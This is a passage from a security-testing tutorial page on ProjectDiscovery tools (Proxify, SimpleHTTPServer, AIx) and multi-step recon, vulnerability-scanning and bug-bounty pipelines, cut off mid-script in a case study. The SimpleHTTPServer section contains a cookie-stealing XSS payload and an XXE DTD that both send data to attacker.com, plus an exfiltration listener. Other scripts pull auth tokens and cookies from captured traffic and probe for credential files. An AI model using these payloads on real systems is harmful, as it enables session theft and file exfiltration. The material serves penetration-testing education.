"$ip" | grep -E "(OrgName|Country)"\n    nmap -sV "$ip" | grep "open"\ndone > ioc_data.txt\n\n# AI-powered threat analysis\ncat ioc_data.txt | aix analyze --prompt "\nAnalyze these network indicators and provide:\n1. Threat actor attribution possibilities\n2. Attack pattern identification\n3. Recommended defensive measures\n4. Additional IOCs to monitor\nConsider current threat landscape and TTPs."\n\n# Generate threat report\naix query "Based on the analyzed IOCs, create a threat intelligence report suitable for sharing with other security teams"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Security Awareness and Training"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Security team education\n# Objective: Generate training content from real findings\n\n# Extract unique vulnerability types\njq -r \'.["template-id"]\' recent_findings.json | sort -u > vuln_types.txt\n\n# Generate training content\ncat vuln_types.txt | while read vuln_type; do\n    aix query "Explain $vuln_type vulnerability in simple terms:\n    1. What is it?\n    2. How is it exploited?\n    3. Real-world impact examples\n    4. Prevention methods\n    Format for security awareness training." > "training_$vuln_type.md"\ndone\n\n# Create security scenarios\naix query "Create 5 realistic security incident scenarios based on common web application vulnerabilities for tabletop exercises"\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"21-proxify---http-proxy-tool",children:"21. Proxify - HTTP Proxy Tool"}),"\n",(0,i.jsx)(n.h4,{id:"overview-20",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Proxify is a Swiss Army Knife proxy tool for HTTP/HTTPS traffic interception, modification, and analysis during security testing."}),"\n",(0,i.jsx)(n.h4,{id:"installation-20",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/proxify/cmd/proxify@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-20",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Start proxy server\nproxify\n\n# Custom port\nproxify -port 8080\n\n# Save traffic to file\nproxify -output traffic.txt\n\n# JSON output\nproxify -json -output traffic.json\n"})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-features-3",children:"Advanced Features"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Traffic Filtering and Modification"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Filter by host\nproxify -filter-host "target.com"\n\n# Filter by HTTP methods\nproxify -filter-method "POST,PUT"\n\n# Modify requests/responses\nproxify -replace-request "oldvalue:newvalue"\n\n# Custom CA certificate\nproxify -cert cert.pem -key key.pem\n'})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-20",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: API Security Testing"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Mobile application API\n# Objective: Intercept and analyze API traffic\n\n# Start proxify with custom configuration\nproxify -port 8080 -json -output api_traffic.json &\nPROXY_PID=$!\n\n# Configure mobile device to use proxy (manual step)\necho \"Configure mobile device proxy: IP:8080\"\n\n# Let application generate traffic for 10 minutes\nsleep 600\n\n# Stop proxy\nkill $PROXY_PID\n\n# Analyze API endpoints\njq -r '.[] | select(.request.method == \"POST\") | .request.url' api_traffic.json | sort -u > api_endpoints.txt\n\n# Extract authentication tokens\njq -r '.[] | .request.headers.Authorization // empty' api_traffic.json | sort -u > auth_tokens.txt\n\n# Find sensitive data in requests\njq -r '.[] | .request.body' api_traffic.json | grep -E \"(password|token|key|secret)\" > sensitive_data.txt\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Web Application Security Assessment"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Complex web application\n# Objective: Map application flow and identify vulnerabilities\n\n# Start interactive proxy\nproxify -port 8080 -verbose &\n\n# Set browser proxy to localhost:8080\n# Browse application manually to generate traffic\n\n# Extract all unique URLs\ngrep -oP 'https?://[^\"\\s]+' proxify.log | sort -u > discovered_urls.txt\n\n# Identify form submissions\ngrep \"POST\" proxify.log | grep -oP 'https?://[^\"\\s]+' > form_endpoints.txt\n\n# Test discovered endpoints with Nuclei\ncat discovered_urls.txt | nuclei -t exposures/ -t vulnerabilities/\n\n# Parameter extraction for fuzzing\ngrep -oP '\\?[^\"\\s&]+' proxify.log | cut -d'=' -f1 | sort -u > parameters.txt\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Bug Bounty Traffic Analysis"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Bug bounty program\n# Objective: Systematic traffic analysis and vulnerability discovery\n\n#!/bin/bash\n# Script: bugbounty_proxy_analysis.sh\n\nPROGRAM_NAME=$1\nPROXY_PORT=8080\n\n# Start proxify with comprehensive logging\nproxify -port $PROXY_PORT -json -output "${PROGRAM_NAME}_traffic.json" -verbose &\nPROXY_PID=$!\n\necho "Proxy started on port $PROXY_PORT"\necho "Configure browser proxy and browse target application"\necho "Press ENTER when traffic collection is complete"\nread\n\n# Stop proxy\nkill $PROXY_PID\n\n# Analysis phase\necho "Analyzing captured traffic..."\n\n# Extract all endpoints\njq -r \'.[] | .request.url\' "${PROGRAM_NAME}_traffic.json" | sort -u > "${PROGRAM_NAME}_endpoints.txt"\n\n# Find potential IDOR vulnerabilities\njq -r \'.[] | select(.request.url | contains("id=") or contains("user=") or contains("account=")) | .request.url\' "${PROGRAM_NAME}_traffic.json" > idor_candidates.txt\n\n# Extract API endpoints\njq -r \'.[] | select(.request.url | contains("/api/") or contains("/v1/") or contains("/v2/")) | .request.url\' "${PROGRAM_NAME}_traffic.json" > api_endpoints.txt\n\n# Find file upload endpoints\njq -r \'.[] | select(.request.headers["Content-Type"] | test("multipart/form-data")) | .request.url\' "${PROGRAM_NAME}_traffic.json" > upload_endpoints.txt\n\n# Extract cookies and sessions\njq -r \'.[] | .request.headers.Cookie // empty\' "${PROGRAM_NAME}_traffic.json" | sort -u > session_tokens.txt\n\n# Generate report\ncat > "${PROGRAM_NAME}_analysis_report.md" << EOF\n# Traffic Analysis Report - $PROGRAM_NAME\n\n## Summary\n- Total requests captured: $(cat "${PROGRAM_NAME}_traffic.json" | jq length)\n- Unique endpoints: $(cat "${PROGRAM_NAME}_endpoints.txt" | wc -l)\n- API endpoints: $(cat api_endpoints.txt | wc -l)\n- IDOR candidates: $(cat idor_candidates.txt | wc -l)\n- Upload endpoints: $(cat upload_endpoints.txt | wc -l)\n\n## Next Steps\n1. Test IDOR candidates with different user contexts\n2. Analyze API endpoints for authorization bypasses\n3. Test file upload functionality for unrestricted uploads\n4. Analyze session management for weaknesses\nEOF\n\necho "Analysis complete. Check ${PROGRAM_NAME}_analysis_report.md"\n'})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-integration-3",children:"Advanced Integration"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Proxify + Nuclei Integration"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Capture traffic and immediately test with Nuclei\nproxify -output traffic.txt &\nPROXY_PID=$!\n\n# ... perform manual testing ...\n\nkill $PROXY_PID\n\n# Extract URLs and test\ngrep -oP 'https?://[^\"\\s]+' traffic.txt | sort -u | nuclei -t exposures/\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Custom Request Modification"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Add custom headers to all requests\nproxify -replace-request "User-Agent:CustomSecurityScanner/1.0"\n\n# Inject XSS payloads into parameters\nproxify -replace-request "param=value:param=<script>alert(1)<\/script>"\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"22-simplehttpserver---enhanced-http-server",children:"22. SimpleHTTPServer - Enhanced HTTP Server"}),"\n",(0,i.jsx)(n.h4,{id:"overview-21",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"SimpleHTTPServer is an enhanced Go version of Python's SimpleHTTPServer with additional security testing features."}),"\n",(0,i.jsx)(n.h4,{id:"installation-21",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/simplehttpserver/cmd/simplehttpserver@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-21",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Start server on port 8080\nsimplehttpserver\n\n# Custom port and directory\nsimplehttpserver -port 9000 -directory /var/www\n\n# Enable HTTPS\nsimplehttpserver -https -cert cert.pem -key key.pem\n"})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-21",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Payload Hosting for Security Testing"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Cross-site scripting (XSS) testing\n# Objective: Host malicious payloads for testing\n\n# Create payload directory\nmkdir -p payloads/{xss,ssrf,xxe}\n\n# XSS payloads\ncat > payloads/xss/payload.js << 'EOF'\n// XSS payload for testing\ndocument.location='http://attacker.com/steal?cookie='+document.cookie;\nEOF\n\n# SSRF payloads\ncat > payloads/ssrf/test.txt << 'EOF'\nSSRF test file - if you can read this, SSRF exists\nEOF\n\n# XXE payloads\ncat > payloads/xxe/external.dtd << 'EOF'\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/exfil?data=%file;'>\">\n%eval;\n%exfiltrate;\nEOF\n\n# Start server\nsimplehttpserver -port 8000 -directory payloads -log requests.log &\n\n# Use in testing\necho \"<script src='http://your-server:8000/xss/payload.js'><\/script>\" > xss_test.html\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Exfiltration Server for Data Leakage Testing"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Data exfiltration testing\n# Objective: Capture exfiltrated data during security testing\n\n#!/bin/bash\n# Script: exfiltration_server.sh\n\nmkdir -p exfil_data\ncd exfil_data\n\n# Start logging server\nsimplehttpserver -port 8000 -log ../exfil.log &\nSERVER_PID=$!\n\necho "Exfiltration server started on port 8000"\necho "Use the following URLs for testing:"\necho "  HTTP: http://your-server:8000/data?leaked=DATA"\necho "  DNS: your-server.com (for DNS exfiltration)"\n\n# Monitor for exfiltrated data\ntail -f ../exfil.log | while read line; do\n    if [[ $line == *"GET"* ]]; then\n        TIMESTAMP=$(date \'+%Y-%m-%d %H:%M:%S\')\n        SOURCE_IP=$(echo "$line" | grep -oP \'\\d+\\.\\d+\\.\\d+\\.\\d+\')\n        LEAKED_DATA=$(echo "$line" | grep -oP \'(?<=leaked=)[^&\\s]*\')\n        \n        if [ ! -z "$LEAKED_DATA" ]; then\n            echo "[$TIMESTAMP] Data leaked from $SOURCE_IP: $LEAKED_DATA"\n            echo "[$TIMESTAMP] $SOURCE_IP: $LEAKED_DATA" >> leaked_data.txt\n        fi\n    fi\ndone &\n\n# Cleanup function\ncleanup() {\n    kill $SERVER_PID 2>/dev/null\n    kill $! 2>/dev/null\n    echo "Exfiltration server stopped"\n}\n\ntrap cleanup EXIT\nread -p "Press ENTER to stop the exfiltration server"\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"advanced-workflows",children:"Advanced Workflows"}),"\n",(0,i.jsx)(n.h3,{id:"multi-tool-integration-pipelines",children:"Multi-Tool Integration Pipelines"}),"\n",(0,i.jsx)(n.h4,{id:"comprehensive-asset-discovery-pipeline",children:"Comprehensive Asset Discovery Pipeline"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\n# Script: comprehensive_asset_discovery.sh\n\nTARGET_DOMAIN=$1\nOUTPUT_DIR="results_$(date +%Y%m%d_%H%M%S)"\nmkdir -p "$OUTPUT_DIR"\n\necho "\ud83c\udfaf Starting comprehensive asset discovery for $TARGET_DOMAIN"\n\n# Phase 1: Subdomain Discovery\necho "\ud83d\udce1 Phase 1: Subdomain Discovery"\nsubfinder -d "$TARGET_DOMAIN" -silent > "$OUTPUT_DIR/subdomains_passive.txt"\necho "   Passive subdomains: $(cat "$OUTPUT_DIR/subdomains_passive.txt" | wc -l)"\n\n# Generate wordlist with alterx\necho -e "api\\ndev\\ntest\\nstaging\\nadmin\\nportal" | alterx > "$OUTPUT_DIR/custom_wordlist.txt"\n\n# Active subdomain brute-forcing\nshuffledns -d "$TARGET_DOMAIN" -w "$OUTPUT_DIR/custom_wordlist.txt" -silent > "$OUTPUT_DIR/subdomains_active.txt"\necho "   Active subdomains: $(cat "$OUTPUT_DIR/subdomains_active.txt" | wc -l)"\n\n# Combine and deduplicate\ncat "$OUTPUT_DIR/subdomains_passive.txt" "$OUTPUT_DIR/subdomains_active.txt" | sort -u > "$OUTPUT_DIR/all_subdomains.txt"\necho "   Total unique subdomains: $(cat "$OUTPUT_DIR/all_subdomains.txt" | wc -l)"\n\n# Phase 2: Live Host Discovery\necho "\ud83d\udd0d Phase 2: Live Host Discovery"\ncat "$OUTPUT_DIR/all_subdomains.txt" | httpx -silent > "$OUTPUT_DIR/live_hosts.txt"\necho "   Live hosts: $(cat "$OUTPUT_DIR/live_hosts.txt" | wc -l)"\n\n# Phase 3: Technology Detection\necho "\ud83d\udee0\ufe0f Phase 3: Technology Detection"\ncat "$OUTPUT_DIR/live_hosts.txt" | httpx -tech-detect -json > "$OUTPUT_DIR/technology_stack.json"\n\n# Extract technologies\njq -r \'.[] | [.url, .tech[]] | @csv\' "$OUTPUT_DIR/technology_stack.json" 2>/dev/null > "$OUTPUT_DIR/technologies.csv"\n\n# Phase 4: Port Scanning\necho "\ud83d\udd0e Phase 4: Port Scanning"\ncat "$OUTPUT_DIR/all_subdomains.txt" | dnsx -silent -a | cut -d\' \' -f2 | sort -u > "$OUTPUT_DIR/resolved_ips.txt"\nnaabu -list "$OUTPUT_DIR/resolved_ips.txt" -top-ports 1000 -silent > "$OUTPUT_DIR/open_ports.txt"\n\n# Phase 5: Web Crawling\necho "\ud83d\udd77\ufe0f Phase 5: Web Crawling"\ncat "$OUTPUT_DIR/live_hosts.txt" | head -20 | katana -depth 2 -silent > "$OUTPUT_DIR/crawled_urls.txt"\n\n# Phase 6: Vulnerability Scanning\necho "\ud83d\udee1\ufe0f Phase 6: Vulnerability Scanning"\ncat "$OUTPUT_DIR/live_hosts.txt" | nuclei -t exposures/ -t misconfiguration/ -silent -json > "$OUTPUT_DIR/vulnerabilities.json"\n\n# Generate Summary Report\ncat > "$OUTPUT_DIR/summary_report.md" << EOF\n# Asset Discovery Summary Report\n\n**Target:** $TARGET_DOMAIN  \n**Date:** $(date)\n\n## Discovered Assets\n- **Subdomains:** $(cat "$OUTPUT_DIR/all_subdomains.txt" | wc -l)\n- **Live Hosts:** $(cat "$OUTPUT_DIR/live_hosts.txt" | wc -l)\n- **Unique IPs:** $(cat "$OUTPUT_DIR/resolved_ips.txt" | wc -l)\n- **Open Ports:** $(cat "$OUTPUT_DIR/open_ports.txt" | wc -l)\n- **Crawled URLs:** $(cat "$OUTPUT_DIR/crawled_urls.txt" | wc -l)\n- **Vulnerabilities:** $(jq length "$OUTPUT_DIR/vulnerabilities.json" 2>/dev/null || echo "0")\n\n## Top Technologies\n$(cut -d\',\' -f2 "$OUTPUT_DIR/technologies.csv" 2>/dev/null | sort | uniq -c | sort -nr | head -10)\n\n## Critical Findings\n$(jq -r \'.[] | select(.info.severity == "critical") | "- " + .info.name + " (" + .host + ")"\' "$OUTPUT_DIR/vulnerabilities.json" 2>/dev/null)\n\n## High Priority Targets\n$(grep -E "(admin|login|portal|dashboard|api)" "$OUTPUT_DIR/live_hosts.txt" | head -10)\nEOF\n\necho "\u2705 Discovery complete! Results saved in $OUTPUT_DIR/"\necho "\ud83d\udcca Summary report: $OUTPUT_DIR/summary_report.md"\n'})}),"\n",(0,i.jsx)(n.h4,{id:"continuous-security-monitoring-pipeline",children:"Continuous Security Monitoring Pipeline"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\n# Script: continuous_security_monitoring.sh\n\nTARGETS_FILE="$1"\nMONITORING_DIR="monitoring_$(date +%Y%m%d)"\nALERT_THRESHOLD=3\n\nmkdir -p "$MONITORING_DIR"/{daily,alerts,trends}\n\nwhile true; do\n    DATE=$(date +%Y%m%d_%H%M)\n    DAILY_DIR="$MONITORING_DIR/daily/$DATE"\n    mkdir -p "$DAILY_DIR"\n    \n    echo "\ud83d\udd04 Starting monitoring cycle at $(date)"\n    \n    # Asset Discovery Changes\n    cat "$TARGETS_FILE" | while read domain; do\n        subfinder -d "$domain" -silent > "$DAILY_DIR/${domain}_subdomains.txt"\n        \n        # Compare with previous day\n        PREV_FILE="$MONITORING_DIR/daily/$(date -d yesterday +%Y%m%d)*/${domain}_subdomains.txt"\n        if ls $PREV_FILE 2>/dev/null; then\n            comm -13 <(cat $PREV_FILE | sort) <(sort "$DAILY_DIR/${domain}_subdomains.txt") > "$DAILY_DIR/${domain}_new_assets.txt"\n            \n            if [ -s "$DAILY_DIR/${domain}_new_assets.txt" ]; then\n                echo "\ud83c\udd95 New assets for $domain:" | tee -a "$MONITORING_DIR/alerts/asset_changes.log"\n                cat "$DAILY_DIR/${domain}_new_assets.txt" | tee -a "$MONITORING_DIR/alerts/asset_changes.log"\n            fi\n        fi\n    done\n    \n    # Vulnerability Monitoring\n    cat "$TARGETS_FILE" | httpx -silent | nuclei -severity high,critical -json > "$DAILY_DIR/vulnerabilities.json"\n    \n    VULN_COUNT=$(jq length "$DAILY_DIR/vulnerabilities.json")\n    if [ "$VULN_COUNT" -gt "$ALERT_THRESHOLD" ]; then\n        echo "\ud83d\udea8 High vulnerability count detected: $VULN_COUNT" | tee -a "$MONITORING_DIR/alerts/vulnerability_spike.log"\n        jq -r \'.[] | "- " + .info.name + " (" + .host + ")"\' "$DAILY_DIR/vulnerabilities.json" | tee -a "$MONITORING_DIR/alerts/vulnerability_spike.log"\n    fi\n    \n    # Certificate Monitoring\n    cat "$TARGETS_FILE" | httpx -silent | tlsx -cert -expiry -json > "$DAILY_DIR/certificates.json"\n    \n    # Check for expiring certificates (30 days)\n    jq -r \'.[] | select(.cert_expiry != null) | [.host, .cert_expiry] | @csv\' "$DAILY_DIR/certificates.json" | \\\n    while IFS=, read host expiry; do\n        expiry_timestamp=$(date -d "$expiry" +%s)\n        current_timestamp=$(date +%s)\n        days_until_expiry=$(( (expiry_timestamp - current_timestamp) / 86400 ))\n        \n        if [ "$days_until_expiry" -lt 30 ]; then\n            echo "\u23f0 Certificate expiring soon: $host ($days_until_expiry days)" | tee -a "$MONITORING_DIR/alerts/cert_expiry.log"\n        fi\n    done\n    \n    # Generate trends\n    echo "$DATE,$VULN_COUNT" >> "$MONITORING_DIR/trends/vulnerability_trend.csv"\n    \n    sleep 3600  # Wait 1 hour\ndone\n'})}),"\n",(0,i.jsx)(n.h4,{id:"bug-bounty-automation-pipeline",children:"Bug Bounty Automation Pipeline"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\n# Script: bugbounty_automation.sh\n\nPROGRAM_NAME="$1"\nSCOPE_FILE="$2"\nOUTPUT_DIR="bugbounty_${PROGRAM_NAME}_$(date +%Y%m%d)"\n\nmkdir -p "$OUTPUT_DIR"/{reconnaissance,analysis,exploitation,reporting}\n\necho "\ud83c\udfaf Starting bug bounty automation for $PROGRAM_NAME"\n\n# Phase 1: Comprehensive Reconnaissance\necho "\ud83d\udce1 Phase 1: Reconnaissance"\ncat "$SCOPE_FILE" | while read scope; do\n    echo "  \ud83d\udd0d Processing scope: $scope"\n    \n    # Subdomain discovery\n    subfinder -d "$scope" -silent | tee -a "$OUTPUT_DIR/reconnaissance/all_subdomains.txt"\n    \n    # Cloud asset discovery\n    if [[ "$scope" == *.* ]]; then\n        cloudlist -provider aws -domain "$scope" 2>/dev/null | tee -a "$OUTPUT_DIR/reconnaissance/cloud_assets.txt"\n    fi\n    \n    # Historical data\n    chaos -d "$scope" -silent 2>/dev/null | tee -a "$OUTPUT_DIR/reconnaissance/historical_subdomains.txt"\ndone\n\n# Deduplicate and resolve\nsort -u "$OUTPUT_DIR/reconnaissance/all_subdomains.txt" > "$OUTPUT_DIR/reconnaissance/unique_subdomains.txt"\ncat "$OUTPUT_DIR/reconnaissance/unique_subdomains.txt" | httpx -silent > "$OUTPUT_DIR/reconnaissance/live_targets.txt"\n\necho "  \ud83d\udcca Discovered $(cat "$OUTPUT_DIR/reconnaissance/unique_subdomains.txt" | wc -l) subdomains"\necho "  \u2705 $(cat "$OUTPUT_DIR/reconnaissance/live_targets.txt" | wc -l) live targets"\n\n# Phase 2: Technology Analysis\necho "\ud83d\udee0\ufe0f Phase 2: Technology Analysis"\ncat "$OUTPUT_DIR/reconnaissance/live_targets.txt" | httpx -tech-detect -title -status-code -json > "$OUTPUT_DIR/analysis/technology_fingerprint.json"\n\n# Extract interesting technologies\njq -r \'.[] | select(.tech != null) | [.url, .tech[]] | @csv\' "$OUTPUT_DIR/analysis/technology_fingerprint.json" > "$OUTPUT_DIR/analysis/tech_stack.csv"\n\n# Identify high-value targets\ngrep -E "(admin|login|portal|dashboard|api|dev|staging|test)" "$OUTPUT_DIR/reconnaissance/live_targets.txt" > "$OUTPUT_DIR/analysis/high_value_targets.txt"\n\n# Phase 3: Vulnerability Discovery\necho "\ud83d\udee1\ufe0f Phase 3: Vulnerability Discovery"\n\n# General vulnerability scanning\ncat "$OUTPUT_DIR/reconnaissance/live_targets.txt" | nuclei -t exposures/ -t misconfiguration/ -severity medium,high,critical -json > "$OUTPUT_DIR/exploitation/general_vulns.json"\n\n# Technology-specific scanning\njq -r \'.tech[]?\' "$OUTPUT_DIR/analysis/technology_fingerprint.json" | sort -u | while read tech; do\n    echo "  \ud83d\udd0e Scanning for $tech vulnerabilities"\n    cat "$OUTPUT_DIR/reconnaissance/live_targets.txt" | nuclei -t "technologies/$tech" -json >> "$OUTPUT_DIR/exploitation/tech_specific_vulns.json" 2>/dev/null\ndone\n\n# Web crawling for additional attack surface\necho "\ud83d\udd77\ufe0f Phase 4: Deep Crawling"\ncat "$OUTPUT_DIR/analysis/high_value_targets.txt" | head -10 | katana -depth 3 -js-crawl -output "$OUTPUT_DIR/analysis/crawled_endpoints.txt"\n\n# Look for sensitive files\necho "\ud83d\udcc1 Phase 5: Sensitive File Discovery"\ncat "$OUTPUT_DIR/reconnaissance/live_targets.txt" | httpx -path "/.git/config,/.env,/config.json,/swagger.json,/.aws/credentials" -mc 200 > "$OUTPUT_DIR/exploitation/sensitive_files.txt"\n\n# Phase 6: Report Generation\necho "\ud83d\udccb Phase 6: Report Generation"\n\n# Count findings\nTOTAL_VULNS=$(jq length "$OUTPUT_DIR/exploitation/general_vulns.json" 2>/dev/null || echo "0")\nCRITICAL_VULNS=$(jq \'[.[] | select(.info.severity == "critical")] | length\' "$OUTPUT_DIR/exploitation/general_vulns.json" 2>/dev/null || echo "0")\nHIGH_VULNS=$(jq \'[.[] | select(.info.severity == "high")] | length\' "$OUTPUT_DIR/exploitation/general_vulns.json" 2>/dev/null || echo "0")\nSENSITIVE_FILES=$(cat "$OUTPUT_DIR/exploitation/sensitive_files.txt" | wc -l)\n\n# Generate executive summary\ncat > "$OUTPUT_DIR/reporting/executive_summary.md" << EOF\n# Bug Bounty Assessment - $PROGRAM_NAME\n\n**Assessment Date:** $(date)  \n**Scope:** $(cat "$SCOPE_FILE" | wc -l) domains  \n**Methodology:** Automated reconnaissance and vulnerability assessment\n\n## Executive Summary\n\n### Asset Discovery\n- **Total Subdomains:** $(cat "$OUTPUT_DIR/reconnaissance/unique_subdomains.txt" | wc -l)\n- **Live Web Services:** $(cat "$OUTPUT_DIR/reconnaissance/live_targets.txt" | wc -l)\n- **High-Value Targets:** $(cat "$OUTPUT_DIR/analysis/high_value_targets.txt" | wc -l)\n\n### Security Findings\n- **Total Vulnerabilities:** $TOTAL_VULNS\n- **Critical:** $CRITICAL_VULNS\n- **High:** $HIGH_VULNS\n- **Sensitive Files Exposed:** $SENSITIVE_FILES\n\n### Top Vulnerabilities\n$(jq -r \'.[] | select(.info.severity == "critical" or .info.severity == "high") | "- **" + .info.name + "** (" + .host + ")"\' "$OUTPUT_DIR/exploitation/general_vulns.json" 2>/dev/null | head -10)\n\n### Recommendations\n1. Immediate attention required for critical and high-severity vulnerabilities\n2. Review and secure exposed sensitive files\n3. Implement proper access controls on administrative interfaces\n4. Regular security assessments for discovered assets\n\n## Detailed Findings\n\n$(jq -r \'.[] | "### " + .info.name + "\\n**Severity:** " + .info.severity + "\\n**Host:** " + .host + "\\n**Description:** " + .info.description + "\\n"\' "$OUTPUT_DIR/exploitation/general_vulns.json" 2>/dev/null)\nEOF\n\necho "\u2705 Bug bounty automation complete!"\necho "\ud83d\udcca Results saved in $OUTPUT_DIR/"\necho "\ud83d\udccb Executive summary: $OUTPUT_DIR/reporting/executive_summary.md"\n\n# Optional: Send notification\nif command -v notify &> /dev/null; then\n    echo "Bug bounty scan complete for $PROGRAM_NAME. Found $TOTAL_VULNS vulnerabilities ($CRITICAL_VULNS critical, $HIGH_VULNS high)" | notify -provider slack\nfi\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"real-world-case-studies",children:"Real-World Case Studies"}),"\n",(0,i.jsx)(n.h3,{id:"case-study-1-fortune-500-financial-institution-assessment",children:"Case Study 1: Fortune 500 Financial Institution Assessment"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Background:"})," A major financial institution required a comprehensive security assessment of their digital infrastructure including web applications, APIs, and cloud services."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scope:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"50+ primary domains"}),"\n",(0,i.jsx)(n.li,{children:"Cloud infrastructure across AWS, Azure, and GCP"}),"\n",(0,i.jsx)(n.li,{children:"Mobile banking applications"}),"\n",(0,i.jsx)(n.li,{children:"Partner integrations"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Methodology:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\n# Case Study 1: Financial Institution Assessment\n\nCOMPANY="megabank"\nSCOPE_FILE="megabank_scope.txt"\nRESULTS_DIR="assessment_${COMPANY}_$(date +%Y%m%d)"\n\nmkdir -p "$RESULTS_DIR"/{discovery,enumeration,vulnerabilities,compliance,reporting}\n\necho "\ud83c\udfe6 Starting comprehensive assessment for $COMPANY"\n\n# Phase 1: Asset Discovery\necho "\ud83d\udce1 Phase 1: Comprehensive Asset Discovery"\n\n# Primary domain enumeration\ncat "$SCOPE_FILE" | while read domain; do\n    echo "  Processing $domain"\n    \n    # Passive reconnaissance\n    subfinder -d "$domain" -all -silent >> "$RESULTS_DIR/discovery/all_subdomains.txt"\n    \n    # Certificate transparency logs\n    chaos -d "$domain" -silent >> "$RESULTS_DIR/discovery/ct_logs.txt"\n    \n    # ASN enumeration for comprehensive IP mapping\n    asnmap -org "$(whois $domain | grep -i \'org-name\' | cut -d\':\' -f2 | xargs)" -silent >> "$RESULTS_DIR/discovery/corporate_ips.txt"\ndone\n\n# Cloud asset discovery\ncloudlist -json > "$RESULTS_DIR/discovery/cloud_assets.json"\n\n# Deduplicate and resolve\nsort -u "$RESULTS_DIR/discovery/all_subdomains.txt" > "$RESULTS_DIR/discovery/unique_subdomains.txt"\ncat "$RESULTS_DIR/discovery/unique_subdomains.txt" | httpx -silent -threads 50 > "$RESULTS_DIR/discovery/live_web_services.txt"\n\necho "  \ud83d\udcca Discovered $(cat "$RESULTS_DIR/discovery/unique_subdomains.txt" | wc -l) unique subdomains"\necho "  \u2705 $(cat "$RESULTS_DIR/discovery/live_web_services.txt" | wc -l) live web services"\n\n# Phase 2: Service Enumeration\necho "\ud83d\udd0d Phase 2: Service Enumeration"\n\n# Port scanning on corporate IP ranges\ncat "$RESULTS_DIR/discovery/corporate_ips.txt" | naabu -top-ports 1000 -rate 1000 -silent > "$RESULTS_DIR/enumeration/open_ports.txt"\n\n# Web technology fingerprinting\ncat "$RESULTS_DIR/discovery/live_web_services.txt" | httpx -tech-detect -title -status-code -content-length -json > "$RESULTS_DIR/enumeration/web_fingerprint.json"\n\n# SSL/TLS analysis for compliance\ncat "$RESULTS_DIR/discovery/live_web_services.txt" | tlsx -cert -cipher -tls-version -json > "$RESULTS_DIR/enumeration/ssl_analysis.json"\n\n# API discovery\ngrep -E "(api|rest|graphql|v1|v2|v3)" "$RESULTS_DIR/discovery/live_web_services.txt" > "$RESULTS_DIR/enumeration/api_endpoints.txt"\n\n# Phase 3: Security Assessment\necho "\ud83d\udee1\ufe0f Phase 3: Security Assessment"\n\n# Critical infrastructure scanning\ncat 